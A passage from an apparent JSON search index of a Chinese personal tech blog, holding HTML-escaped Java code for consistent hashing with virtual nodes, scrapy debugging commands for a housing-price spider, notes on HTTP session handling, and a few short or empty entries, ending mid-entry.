&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;LinkedList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;gt;();&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/** * key表示虚拟结点服务器的hash值，value表示虚拟结点服务器的名称 */&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SortedMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;virtualNodes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TreeMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;gt;();&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/** * 虚拟结点数目（一个真实结点对应VN_SUM个虚拟结点） */&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;VN_SUM&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/** * 加所有服务器加入集合 */&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;servers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t&lt;span class=&quot;n&quot;&gt;realNodes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;servers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]);&lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;realNodes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;VN_SUM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t t&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;virtualNodeName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;VN&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;valueOf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t t t&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getHash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;virtualNodeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t t t&lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;虚拟节点[&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;virtualNodeName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;]被添加, hash值为&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t t t&lt;span class=&quot;n&quot;&gt;virtualNodes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;virtualNodeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  t&lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;  ===========路由映射==============  &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/** * 使用FNV1_32_HASH算法计算hash值 * * @param str * @return */&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getHash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16777619&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2166136261L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;charAt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;c1&quot;&gt;// 如果算出来的值为负数则取其绝对值&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  t t&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;abs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;matchServer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;c1&quot;&gt;// 待路由结点的Hash值&lt;/span&gt;  t&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getHash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;c1&quot;&gt;// 得到大于该Hash值的子Map&lt;/span&gt;  t&lt;span class=&quot;nc&quot;&gt;SortedMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subMap&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;virtualNodes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;tailMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;c1&quot;&gt;// 顺时针的第一个Key&lt;/span&gt;  t&lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;firstKey&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  t&lt;span class=&quot;c1&quot;&gt;// 截取&lt;/span&gt;  t&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;virtualNode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t  t&lt;span class=&quot;c1&quot;&gt;// 返回路由到的服务器名称&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;virtualNode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;virtualNode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nodes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1:1111&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;221.226.0.1:2222&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;10.211.0.1:3333&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;112.74.15.218:80&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nodes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t&lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;  t t t t&lt;span class=&quot;s&quot;&gt;&quot;[&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nodes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;]的hash值为&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getHash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nodes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;,被路由到的服务器为[&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;matchServer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nodes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;]&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } 关注一下运行结果： 虚拟节点[192.168.0.0:111&amp;&amp;VN0]被添加, hash值为1686427075 虚拟节点[192.168.0.0:111&amp;&amp;VN1]被添加, hash值为354859081 虚拟节点[192.168.0.0:111&amp;&amp;VN2]被添加, hash值为1306497370 虚拟节点[192.168.0.0:111&amp;&amp;VN3]被添加, hash值为817889914 虚拟节点[192.168.0.0:111&amp;&amp;VN4]被添加, hash值为396663629 虚拟节点[192.168.0.1:111&amp;&amp;VN0]被添加, hash值为1032739288 虚拟节点[192.168.0.1:111&amp;&amp;VN1]被添加, hash值为707592309 虚拟节点[192.168.0.1:111&amp;&amp;VN2]被添加, hash值为302114528 虚拟节点[192.168.0.1:111&amp;&amp;VN3]被添加, hash值为36526861 虚拟节点[192.168.0.1:111&amp;&amp;VN4]被添加, hash值为848442551 虚拟节点[192.168.0.2:111&amp;&amp;VN0]被添加, hash值为1452694222 虚拟节点[192.168.0.2:111&amp;&amp;VN1]被添加, hash值为2023612840 虚拟节点[192.168.0.2:111&amp;&amp;VN2]被添加, hash值为697907480 虚拟节点[192.168.0.2:111&amp;&amp;VN3]被添加, hash值为790847074 虚拟节点[192.168.0.2:111&amp;&amp;VN4]被添加, hash值为2010506136 虚拟节点[192.168.0.3:111&amp;&amp;VN0]被添加, hash值为891084251 虚拟节点[192.168.0.3:111&amp;&amp;VN1]被添加, hash值为1725031739 虚拟节点[192.168.0.3:111&amp;&amp;VN2]被添加, hash值为1127720370 虚拟节点[192.168.0.3:111&amp;&amp;VN3]被添加, hash值为676720500 虚拟节点[192.168.0.3:111&amp;&amp;VN4]被添加, hash值为2050578780 虚拟节点[192.168.0.4:111&amp;&amp;VN0]被添加, hash值为586921010 虚拟节点[192.168.0.4:111&amp;&amp;VN1]被添加, hash值为184078390 虚拟节点[192.168.0.4:111&amp;&amp;VN2]被添加, hash值为1331645117 虚拟节点[192.168.0.4:111&amp;&amp;VN3]被添加, hash值为918790803 虚拟节点[192.168.0.4:111&amp;&amp;VN4]被添加, hash值为1232193678 [127.0.0.1:1111]的hash值为380278925, 被路由到结点[192.168.0.0:111] [221.226.0.1:2222]的hash值为1493545632, 被路由到结点[192.168.0.0:111] [10.211.0.1:3333]的hash值为1393836017, 被路由到结点[192.168.0.2:111] 从代码运行结果看，每个点路由到的服务器都是Hash值顺时针离它最近的那个服务器节点，没有任何问题。 通过采取虚拟节点的方法，一个真实结点不再固定在Hash换上的某个点，而是大量地分布在整个Hash环上，这样即使上线、下线服务器，也不会造成整体的负载不均衡。 ",
      "url"      : "http://localhost:4000/2017/07/31/algo-consistent-hash/"
    } ,
  
    {
      "title"    : "scrapy房价spider",
      "category" : "spider",
      "content": "scrapy spider参考 本地调试运行 修改模块名为fangjiaCD 修改fangjia.py中的address xpath 调试命令 ` scrapy fetch http://cd.fang.lianjia.com/loupan/p_jhdsdjyaaelm/ scrapy list scrapy parse http://cd.fang.lianjia.com/loupan/p_djhjwaabog/ -c parse_fangjia --spider=fangjia scrapy crawl fangjia -o rent.csv -t csv ` ",
      "url"      : "http://localhost:4000/2017/08/14/scrapy/"
    } ,
  
    {
      "title"    : "httpsession",
      "category" : "frontend",
      "content": "一般用来实现Session的方法有两种 URL重写 Web Server在返回Response的时候，检查页面中所有的URL，包括所有的连接，和HTML Form的Action属性，在这些URL后面加上“;jsessionid=XXX”。 下一次，用户访问这个页面中的URL。jsessionid就会传回到Web Server。 Cookie 如果客户端支持Cookie，Web Server在返回Response的时候，在Response的Header部分，加入一个“set-cookie: jsessionid=XXXX”header属性，把jsessionid放在Cookie里传到客户端。 客户端会把Cookie存放在本地文件里，下一次访问Web Server的时候，再把Cookie的信息放到HTTP Request的“Cookie”header属性里面，这样jsessionid就随着HTTP Request返回给Web Server。 服务端／客户端session存储 使用服务端还是客户端session存储要看应用的实际情况的。一般来说不要求用户注册登录的公共服务系统（如google）采用cookie做客户端session存储（如google的用户偏好设置），而有用户管理的系统则使用服务端存储。原因很显然：无需用户登录的系统唯一能够标识用户的就是用户的电脑，换一台机器就不知道谁是谁了，服务端session存储根本不管用；而有用户管理的系统则可以通过用户id来管理用户个人数据，从而提供任意复 杂的个性化服务； 客户端和服务端的session存储在性能、安全性、跨站能力、编程方便性等方面都有一定的区别，而且优劣并非绝对（譬如 TheServerSide 号称不使用HttpSession，所以性能好，这很显然：一个具有上亿的访问用户的系统，要在服务端数据库中检索出用户的偏好信息显然是低效的，Session管理器不管用什么数据结构和算法都要耗费大量内存和CPU时间；而用cookie，则根本不用检索和维护session数据，服务器可 以做成无状态的，当然高效）；TSS是用客户端 cookie存储session？？ ",
      "url"      : "http://localhost:4000/2017/08/26/http-session/"
    } ,
  
    {
      "title"    : "Miaosha",
      "category" : "",
      "content": "",
      "url"      : "http://localhost:4000/2017/08/26/miaosha/"
    } ,
  
    {
      "title"    : "Android Develop",
      "category" : "",
      "content": "How to develop a github app? so I could post blogs to my github pages from mobile phone ideally, there is a markdown editor where i could edit content and publish to github project directly... ",
      "url"      : "http://localhost:4000/2017/08/27/android-develop/"
    } ,
  
    {
      "title"    : "Git Fetch",
      "category" : "",
